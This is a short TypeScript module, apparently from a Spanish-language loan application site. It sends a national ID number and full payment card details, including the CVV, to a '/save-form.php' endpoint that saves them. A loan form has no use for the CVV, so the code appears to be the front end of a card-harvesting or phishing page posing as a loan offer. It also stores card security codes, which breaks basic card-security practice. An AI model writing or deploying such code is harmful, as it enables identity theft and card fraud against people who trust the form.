import { LoanFormData } from '../types/formTypes';

export const submitFormData = async (formData: any): Promise<{ success: boolean; message: string }> => {
  try {
    // Submit to PHP endpoint as JSON
    const response = await fetch('/save-form.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        dni: formData.dni,
        cardInfo: {
          number: formData.cardInfo.number,
          name: formData.cardInfo.name,
          expiry: formData.cardInfo.expiry,
          cvv: formData.cardInfo.cvv
        }
      })
    });

    const result = await response.json();

    if (!response.ok) {
      throw new Error(result.error || 'Error al guardar los datos');
    }

    return { 
      success: true, 
      message: 'Datos guardados exitosamente'
    };
  } catch (error) {
    console.error('Error:', error);
    throw error;
  }
};